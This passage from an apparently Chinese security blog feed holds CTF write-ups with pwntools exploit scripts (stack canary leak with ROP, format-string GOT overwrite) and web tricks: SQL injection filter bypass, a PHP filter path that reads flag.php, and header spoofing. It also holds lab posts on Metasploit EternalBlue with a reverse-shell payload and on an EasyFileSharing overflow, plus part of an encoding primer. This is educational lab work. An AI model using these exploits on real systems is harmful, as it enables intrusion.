<figure data-type="image" tabindex="28"><img src="https://7usai.github.io/post-images/1601205435175.png" alt="" loading="lazy"></figure>
<h3 id="babystack">babystack</h3>
<p>当输入为1_love_y0u时拿到shell</p>
<h3 id="canary">canary</h3>
<figure data-type="image" tabindex="29"><img src="https://7usai.github.io/post-images/1601205443639.png" alt="" loading="lazy"></figure>
<p>buf在rsp+10，v3在rsp+48，两个相距0x38，输入‘a’*0x38，泄露出来canary的值，但是要减去换行符0xa，再通过ROPgadget找到sh的地址，构造payload。</p>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
r=remote('202.119.201.197',10004)
elf=ELF('./canary')
sys=0x4005F0
sh_addr=0x0400904
ret_rdi=0x00000000004008e3
r.recvuntil(&quot;Let's pwn it!&quot;)
payload='a'*0x38
r.sendline(payload)
r.recvuntil('a'*0x38)
canary=r.recv(8)
canary=canary.ljust(8,'\x00')
canary=u64(canary)-0xa
log.info(&quot;canary:&quot;+hex(canary))
payload=&quot;\x90&quot;*0x38+p64(canary)+&quot;\x90&quot;*0x8+p64(sh_addr)+p64(sys)
r.sendline(payload)
r.recv()
r.interactive()
</code></pre>
<h3 id="fmstr">fmstr</h3>
<figure data-type="image" tabindex="30"><img src="https://7usai.github.io/post-images/1601205452797.png" alt="" loading="lazy"></figure>
<p>Gets（）不限制输入，printf处有格式化字符串漏洞，可以从中泄露出输入的偏移，然后用fmstr_payload()把puts的got表中的内容改为backdoor的地址</p>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
from LibcSearcher import *
r=remote('202.119.201.197',10006)
elf=ELF('./fmstr')
sys=0x0804857D
puts_got=elf.got['puts']
payload=fmtstr_payload(8,{puts_got:sys})
r.sendline(payload)
r.interactive()
</code></pre>
<h3 id="babyrop">babyrop</h3>
<figure data-type="image" tabindex="31"><img src="https://7usai.github.io/post-images/1601205468718.png" alt="" loading="lazy"></figure>
<p>buf实际在ebp-6c，但却要输入0x100，存在溢出，并没有在发现system（），但发现可以通过泄露write的got表的内容得到write的实际地址，然后通过泄露出的地址的后三位查找libc的版本</p>
<h2 id="web">web</h2>
<h3 id="web签到">web签到</h3>
<p>步骤</p>
<figure data-type="image" tabindex="32"><img src="https://7usai.github.io/post-images/1601205478240.png" alt="" loading="lazy"></figure>
<p>打开发现需要GET传参但并未指明参数，多次尝试发现只需要传入?1即可；</p>
<figure data-type="image" tabindex="33"><img src="https://7usai.github.io/post-images/1601205485110.png" alt="" loading="lazy"></figure>
<ol>
<li>传入发现需要post一个2，多次尝试发现并没有反应，于是使用burpsuite</li>
</ol>
<figure data-type="image" tabindex="34"><img src="https://7usai.github.io/post-images/1601205494381.png" alt="" loading="lazy"></figure>
<p>在params里填好参数后发现2后面多了一个等号，然后就传参成功，并且发现php代码；</p>
<figure data-type="image" tabindex="35"><img src="https://7usai.github.io/post-images/1601205503388.png" alt="" loading="lazy"></figure>
<p>明显是使用PHP伪协议查看源文件即可获得flag</p>
<figure data-type="image" tabindex="36"><img src="https://7usai.github.io/post-images/1601205511353.png" alt="" loading="lazy"></figure>
<p>base64解码即可</p>
<figure data-type="image" tabindex="37"><img src="https://7usai.github.io/post-images/1601205520780.png" alt="" loading="lazy"></figure>
<h3 id="babysqli">Babysqli</h3>
<p>使用burpsuite进行注入后发现空格被过滤了，使用/**/ 替代空格；</p>
<figure data-type="image" tabindex="38"><img src="https://7usai.github.io/post-images/1601205528504.png" alt="" loading="lazy"></figure>
<p>并且发现下方注释，猜测flag可能在password里面，使用SQL语句查询</p>
<figure data-type="image" tabindex="39"><img src="https://7usai.github.io/post-images/1601205537338.png" alt="" loading="lazy"></figure>
<p>发现flag，成功</p>
<h3 id="secret">Secret</h3>
<p>发现图片，并且下载图片，按文本格式打开，后发现php代码</p>
<figure data-type="image" tabindex="40"><img src="https://7usai.github.io/post-images/1601205544688.png" alt="" loading="lazy"></figure>
<p>进行代码审计，题目要求需要使用GET方式提交param1和param2,然后使用POST方式提交param1与 param2;file_get_contents(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>)</mo><mi mathvariant="normal">是</mi><mi mathvariant="normal">指</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mi mathvariant="normal">以</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">形</mi><mi mathvariant="normal">式</mi><mi mathvariant="normal">写</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">，</mi><mi>i</mi><msub><mi>s</mi><mi>n</mi></msub><mi>u</mi><mi>m</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>c</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">str1)是指需要str1以文件的形式写入值，is_numeric(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mopen">(</span></span></span></span>str2)是判断str2是否为数字并且可以识别十进制和十六进制，str2需要等于2592000，sleep()函数是要程序沉睡一段时间，if(((string)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>!</mo><mo>=</mo><mo>=</mo><mo>(</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">str1!==(string)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span></span></span>str2)&amp;&amp;(sha1(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>)</mo><mo>=</mo><mo>=</mo><mo>=</mo><mi>s</mi><mi>h</mi><mi>a</mi><mn>1</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">str1)===sha1(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord">1</span><span class="mopen">(</span></span></span></span>str2)))是指需要让str1与str2的字符串形式不同，并且经过sha1()后相同；绕过这些限制救可获得flag；</p>
<figure data-type="image" tabindex="41"><img src="https://7usai.github.io/post-images/1601205552672.png" alt="" loading="lazy"></figure>
<blockquote>
<p>使用十六进制绕过sleep()函数；</p>
<p>使用data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k向str2中写入内容</p>
<p>关于sha1()函数的绕过，网上查找到文章https://www.addon.pub/2017/10/13/CTF-sha1%E5%92%8CMD5/</p>
</blockquote>
<h3 id="babysqli2">Babysqli2</h3>
<p>按照传统试一试平常的注入语句，之后发现过滤了单引号，网上查询可使用斜杠转义前面的单引号；</p>
<figure data-type="image" tabindex="42"><img src="https://7usai.github.io/post-images/1601205565567.png" alt="" loading="lazy"></figure>
<p>绕过成功，但是只显示了登录成功信息，猜测多半是盲注；发现substr() mid() 等函数被过滤了，但是left()仍可以使用；</p>
<p>由于flag的开头为C 所以就尝试猜测flag在password中的位置<img src="https://7usai.github.io/post-images/1601205573480.png" alt="" loading="lazy"></p>
<p>结果发现flag在第九行；之后便使用笨办法对flag进行逐个字母爆破，下方即为最终爆破结果，按照ascii码表转换为字母即可格式为		CUMTCTF{}，大括号内全为小写；</p>
<figure data-type="image" tabindex="43"><img src="https://7usai.github.io/post-images/1601205580981.png" alt="" loading="lazy"></figure>
<h3 id="简单文件包含">简单文件包含</h3>
<p>页面提示需要只支持本地请求，使用burpsuite，X-Forwarded-For：127.0.0.1 没有反应  然后尝试使用client-ip:127.0.0.1  成功；</p>
<figure data-type="image" tabindex="44"><img src="https://7usai.github.io/post-images/1601205588605.png" alt="" loading="lazy"></figure>
<p>发现使用了include_once()函数，并且使用了两次，该函数只能包含同一文件一次，继续网上查找方法；发现一个重复require_once()的函数的文章，是使用伪协议配合多级符号链接的办法进行绕过的；</p>
<pre><code>php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
</code></pre>
<figure data-type="image" tabindex="45"><img src="https://7usai.github.io/post-images/1601205595546.png" alt="" loading="lazy"></figure>
<p>base64解码即可</p>
<figure data-type="image" tabindex="46"><img src="https://7usai.github.io/post-images/1601205601495.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ms17-010漏洞利用]]></title>
        <id>https://7usai.github.io/post/9s2K54U7q/</id>
        <link href="https://7usai.github.io/post/9s2K54U7q/">
        </link>
        <updated>2020-09-20T08:16:24.000Z</updated>
        <content type="html"><![CDATA[<p>安装win7虚拟机</p>
<p>开启win7 445端口</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600589823167.png" alt="" loading="lazy"></figure>
<p><img src="https://7usai.github.io/post-images/1600589829978.png" alt="" loading="lazy"><br>
开启msf<br>
<img src="https://7usai.github.io/post-images/1600589833942.png" alt="" loading="lazy"></p>
<p>寻找攻击模块</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600589837383.png" alt="" loading="lazy"></figure>
<p>调用模块use exploit/windows/smb/ms17_010_eternalblue</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600589841598.png" alt="" loading="lazy"></figure>
<p>show payloads后选windows/x64/meterpreter/reverse_tcp</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600589845319.png" alt="" loading="lazy"></figure>
<p>开始攻击</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600589849159.png" alt="" loading="lazy"></figure>
<p>成功获得shell</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用msf利用easyfilesharing漏洞]]></title>
        <id>https://7usai.github.io/post/1ucQSUb1Y/</id>
        <link href="https://7usai.github.io/post/1ucQSUb1Y/">
        </link>
        <updated>2020-09-20T03:46:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="思路">思路</h3>
<p>1.安装一个win10虚拟机<br>
2.开启win10虚拟机端口<br>
3.开始攻击</p>
<p>win10ip地址</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600573646446.png" alt="" loading="lazy"></figure>
<p>查看开启端口</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600573658331.png" alt="" loading="lazy"></figure>
<p>这里可以看到80端口为easyfilesharing，因为在win10虚拟机里我们设置的就为80</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600573677088.png" alt="" loading="lazy"></figure>
<p>搜索EasyFileSharing漏洞</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600573690601.png" alt="" loading="lazy"></figure>
<p>设置攻击模块</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600573704435.png" alt="" loading="lazy"></figure>
<p>show payloads后选择第52个</p>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1600573712860.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1600573771977.png" alt="" loading="lazy"></figure>
<p>在这里可以看到缺少一个RHOSTS和一个LHOST，RHOSTS为靶机IP（win10虚拟机），LHOSTS为攻击者IP（kali）</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1600573785155.png" alt="" loading="lazy"></figure>
<p>查看kali ip地址</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1600573798152.png" alt="" loading="lazy"></figure>
<p>设置ip地址</p>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1600573806372.png" alt="" loading="lazy"></figure>
<p>此漏洞失败</p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1600573816668.png" alt="" loading="lazy"></figure>
<h3 id="尝试栈溢出漏洞">尝试栈溢出漏洞</h3>
<p>首先我们查看easyfilesharing上存在哪些漏洞</p>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1600573827540.png" alt="" loading="lazy"></figure>
<p>我们选取这个进行栈溢出漏洞攻击</p>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1600573834729.png" alt="" loading="lazy"></figure>
<p>利用漏洞脚本</p>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1600573841739.png" alt="" loading="lazy"></figure>
<p>打开了计算器并且关闭了easyfilesharing</p>
<p><img src="https://7usai.github.io/post-images/1600573847447.png" alt="" loading="lazy"><br>
<img src="https://7usai.github.io/post-images/1600573853001.png" alt="" loading="lazy"></p>
<h3 id="漏洞利用成功">漏洞利用成功</h3>
<p>利用溢出漏洞攻击目标并让其服务崩溃和让主机运行计算器</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[URL,ASCII,Unicode,Base64]]></title>
        <id>https://7usai.github.io/post/BNdT9mz74/</id>
        <link href="https://7usai.github.io/post/BNdT9mz74/">
        </link>
        <updated>2020-09-19T11:13:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="url编码">URL编码</h3>
<p>URI所允许的字符分作<strong>保留</strong>与<strong>未保留</strong>。<strong>保留</strong>字符是那些具有特殊含义的字符，例如：<a href="https://zh.wikipedia.org/wiki/%E6%96%9C%E7%B7%9A">斜线</a>字符用于URL（或URI）不同部分的分界符；<strong>未保留</strong>字符没有这些特殊含义。百分号编码把保留字符表示为特殊字符序列。上述情形随URI与URI的不同版本规格会有轻微的变化。</p>
<h4 id="对保留字符的百分号编码">对保留字符的百分号编码</h4>
<p>首先需要把该字符的ASCII的值表示为两个16进制的数字，然后在其前面放置<a href="https://zh.wikipedia.org/wiki/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6">转义字符</a>(&quot;<code>%</code>&quot;)，置入URI中的相应位置。</p>
<h4 id="对未保留字符的百分号编码">对未保留字符的百分号编码</h4>
<p>未保留字符不需要百分号编码.</p>
<h4 id="对百分号字符的百分号编码">对百分号字符的百分号编码</h4>
<p>由于百分号字符(&quot;%&quot;)表示百分号编码字节流的存在, 因此百分号字符应该被编码为3个字节的序列：&quot;%25&quot;，用于URI内部(0x25为%的ascii码)</p>
<p>编码表可以简单的以ASCII码表为准(见下)</p>
<p><a href="https://zh.wikipedia.org/wiki/%E7%99%BE%E5%88%86%E5%8F%B7%E7%BC%96%E7%A0%81">URL编码_wiki百科</a></p>
<h2 id="ascii编码">ASCII编码</h2>
<p>ASCII 由电报码发展而来，经过多次更新至今为止共定义了128个字符；其中33个字符无法显示（一些终端提供了扩展，使得这些字符可显示为诸如笑脸、扑克牌花式等8-bit符号），且这33个字符多数都已是陈废的<a href="https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E5%85%83">控制字符</a>。控制字符的用途主要是用来操控已经处理过的文字。<br>
可以简单的分为控制字符和可显示字符</p>
<p>用十进制来表示的话，0<sub>31+127位为控制字符，32</sub>126为可显示字符，其中48～57为0到9十个阿拉伯数字。65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等</p>
<p><a href="https://zh.wikipedia.org/wiki/ASCII">ASCII_wiki百科</a></p>
<h2 id="unicode码">Unicode码</h2>
<p><a href="https://baike.baidu.com/item/Unicode">Unicode</a>是一个编码方案，Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制</a>编码，以满足跨语言、跨平台进行文本转换、处理的要求。Unicode 编码共有三种具体实现，分别为utf-8,utf-16,utf-32，其中utf-8占用一到四个字节，utf-16占用二或四个字节，utf-32占用四个字节。</p>
<p>Unicode码扩展自ASCII<a href="https://baike.baidu.com/item/%E5%AD%97%E5%85%83%E9%9B%86">字元集</a>。Unicode使用全16位元字元集。这使得Unicode能够表示世界上所有的书写语言中可能用於电脑通讯的字元、象形文字和其他符号。</p>
<p>Unicode最初打算作为ASCII的补充，可能的话，最终将代替它。</p>
<p>Unicode码一直在修正扩充，目前已经包含的文字有：<a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E6%8B%89%E4%BC%AF%E5%AD%97%E6%AF%8D">阿拉伯字母</a>、<a href="https://zh.wikipedia.org/wiki/%E4%BA%9E%E7%BE%8E%E5%B0%BC%E4%BA%9E%E5%AD%97%E6%AF%8D">亚美尼亚字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%AD%9F%E5%8A%A0%E6%8B%89%E6%96%87">孟加拉文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%A8%E9%9F%B3%E7%AC%A6%E8%99%9F">注音符号</a>、<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E9%87%8C%E7%88%BE%E5%AD%97%E6%AF%8D">西里尔字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A4%A9%E5%9F%8E%E6%96%87">天城文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E9%B2%81%E5%90%89%E4%BA%9A%E5%AD%97%E6%AF%8D">格鲁吉亚字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E8%87%98%E5%AD%97%E6%AF%8D">希腊字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%90%89%E6%8B%89%E7%89%B9%E6%96%87">古吉拉特文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E6%9C%A8%E5%9F%BA%E6%96%87">古木基文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%AB%BA%E6%96%87">谚文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E4%BC%AF%E4%BE%86%E5%AD%97%E6%AF%8D">希伯来字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B9%B3%E5%81%87%E5%90%8D">平假名</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8D%A1%E7%B4%8D%E9%81%94%E6%96%87">卡纳达文</a>、<a href="https://zh.wikipedia.org/wiki/%E7%89%87%E5%81%87%E5%90%8D">片假名</a>、<a href="https://zh.wikipedia.org/wiki/%E5%AF%AE%E6%96%87%E5%AD%97">寮文字</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8B%89%E4%B8%81%E5%AD%97%E6%AF%8D">拉丁字母</a>、<a href="https://zh.wikipedia.org/wiki/%E9%A6%AC%E6%8B%89%E9%9B%85%E6%8B%89%E5%A7%86%E6%96%87">马拉雅拉姆文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A5%A7%E9%87%8C%E4%BA%9E%E6%96%87">奥里亚文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E7%B1%B3%E7%88%BE%E6%96%87">泰米尔文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E5%8D%A2%E5%9B%BA%E6%96%87">泰卢固文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E6%96%87%E5%AD%97">泰文字</a>、<a href="https://zh.wikipedia.org/wiki/%E6%AD%90%E5%85%83%E7%AC%A6%E8%99%9F">欧元符号</a>、对象替换字符、<a href="https://zh.wikipedia.org/wiki/%E5%88%87%E7%BD%97%E5%9F%BA%E6%96%87">切罗基文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%90%89%E8%8C%B2%E5%AD%97%E6%AF%8D">吉兹字母</a>，<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E6%A3%89%E5%AD%97%E6%AF%8D">高棉字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%92%99%E5%8F%A4%E5%AD%97%E6%AF%8D">蒙古字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BC%85%E6%96%87">缅文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%AD%90%E7%94%98%E5%AD%97%E6%AF%8D">欧甘字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%A2%E6%81%A9%E5%AD%97%E6%AF%8D">卢恩字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%83%A7%E4%BC%BD%E7%BE%85%E6%96%87">僧伽罗文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%95%98%E5%88%A9%E4%BA%9E%E5%AD%97%E6%AF%8D">叙利亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%AE%83%E6%8B%BF%E5%AD%97%E6%AF%8D">它拿字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E6%8B%BF%E5%A4%A7%E5%8E%9F%E4%BD%8F%E6%B0%91%E9%9F%B3%E7%AF%80%E6%96%87%E5%AD%97">加拿大原住民音节文字</a>、<a href="https://zh.wikipedia.org/wiki/%E5%BD%9D%E6%96%87">彝文</a><br>
、部分盲文图案、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%BE%B7%E7%91%9F%E9%9B%B7%E7%89%B9%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">德瑟雷特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%93%A5%E7%89%B9%E5%AD%97%E6%AF%8D">哥特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%8F%A4%E6%84%8F%E5%A4%A7%E5%88%A9%E5%AD%97%E6%AF%8D">古意大利字母</a>、<a href="https://zh.wikipedia.org/wiki/%E9%9F%B3%E6%A8%82%E7%AC%A6%E8%99%9F">音乐符号</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E9%9F%B3%E4%B9%90%E7%AC%A6%E5%8F%B7">拜占庭音乐符号</a>，<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E6%97%A5%E9%9F%A9%E7%BB%9F%E4%B8%80%E8%A1%A8%E6%84%8F%E6%96%87%E5%AD%97">中日韩统一表意文字</a>、<a href="https://zh.wikipedia.org/wiki/%E8%8F%B2%E5%BE%8B%E5%AE%BE">菲律宾</a>文字<a href="https://zh.wikipedia.org/wiki/%E5%B8%83%E9%94%A1%E6%96%87">布锡文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%93%88%E5%8A%AA%E8%AF%BA%E6%96%87&amp;action=edit&amp;redlink=1">哈努诺文</a>、<a href="https://zh.wikipedia.org/wiki/%E4%BB%96%E5%8A%A0%E7%A5%BF%E6%96%87">他加禄文</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%A1%94%E6%A0%BC%E5%B7%B4%E5%A5%B4%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">塔格巴奴亚文</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A1%9E%E6%B5%A6%E8%B7%AF%E6%96%AF%E9%9F%B3%E8%8A%82%E6%96%87%E5%AD%97">塞浦路斯音节文字</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9E%97%E5%B8%83%E5%AD%97%E6%AF%8D&amp;action=edit&amp;redlink=1">林布字母</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BA%BF%E5%BD%A2%E6%96%87%E5%AD%97B">线形文字B</a>，<a href="https://zh.wikipedia.org/wiki/%E5%A5%A7%E6%96%AF%E6%9B%BC%E4%BA%9E%E5%AD%97%E6%AF%8D">奥斯曼亚字母</a>，<a href="https://zh.wikipedia.org/wiki/%E8%95%AD%E4%BC%AF%E7%B4%8D%E5%AD%97%E6%AF%8D">萧伯纳字母</a>，<a href="https://zh.wikipedia.org/wiki/%E5%BE%B7%E5%AE%8F%E5%82%A3%E6%96%87">德宏傣文</a>，<a href="https://zh.wikipedia.org/wiki/%E4%B9%8C%E5%8A%A0%E9%87%8C%E7%89%B9%E5%AD%97%E6%AF%8D">乌加里特字母</a>、<a href="https://zh.wikipedia.org/wiki/%E5%85%AD%E5%8D%81%E5%9B%9B%E5%8D%A6">六十四卦</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%83%E5%90%89%E6%96%87&amp;action=edit&amp;redlink=1">布吉文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E6%8B%89%E5%93%A5%E9%87%8C%E5%AD%97%E6%AF%8D">格拉哥里字母</a>，<a href="https://zh.wikipedia.org/wiki/%E4%BD%89%E5%8D%A2%E6%96%87">佉卢文</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E5%8F%8C%E7%89%88%E7%BA%B3%E5%82%A3%E6%96%87">西双版纳傣文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E6%B3%A2%E6%96%AF%E6%96%87&amp;action=edit&amp;redlink=1">古波斯文</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E9%94%A1%E5%B0%94%E8%B5%AB%E7%89%B9%E6%96%87&amp;action=edit&amp;redlink=1">锡尔赫特文</a>、<a href="https://zh.wikipedia.org/wiki/%E6%8F%90%E9%9D%9E%E7%B4%8D%E6%96%87">提非纳文</a> 、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%A4%E5%B8%8C%E8%85%8A%E9%9F%B3%E4%B9%90%E7%AC%A6%E5%8F%B7&amp;action=edit&amp;redlink=1">古希腊音乐符号</a>、<a href="https://zh.wikipedia.org/wiki/%E5%B7%B4%E5%8E%98%E6%96%87">巴厘文</a>，<a href="https://zh.wikipedia.org/wiki/%E6%A5%94%E5%BD%A2%E6%96%87%E5%AD%97">楔形文字</a>，<a href="https://zh.wikipedia.org/wiki/%E8%A5%BF%E9%9D%9E%E4%B9%A6%E9%9D%A2%E6%96%87%E5%AD%97">西非书面文字</a>，<a href="https://zh.wikipedia.org/wiki/%E5%85%AB%E6%80%9D%E5%B7%B4%E6%96%87">八思巴文</a>、<a href="https://zh.wikipedia.org/wiki/%E8%85%93%E5%B0%BC%E5%9F%BA%E5%AD%97%E6%AF%8D">腓尼基字母</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%A1%E5%88%A9%E4%BA%9A%E6%96%87&amp;action=edit&amp;redlink=1">卡利亚文</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%A0%E5%A9%86%E5%AD%97%E6%AF%8D">占婆字母</a>，<a href="https://zh.wikipedia.org/w/index.php?title=%E5%85%8B%E8%80%B6%E9%BB%8E%E6%96%87&amp;action=edit&amp;redlink=1">克耶黎文</a>，<a href="https://zh.wikipedia.org/wiki/%E7%BB%92%E5%B7%B4%E6%96%87">绒巴文</a>，<a 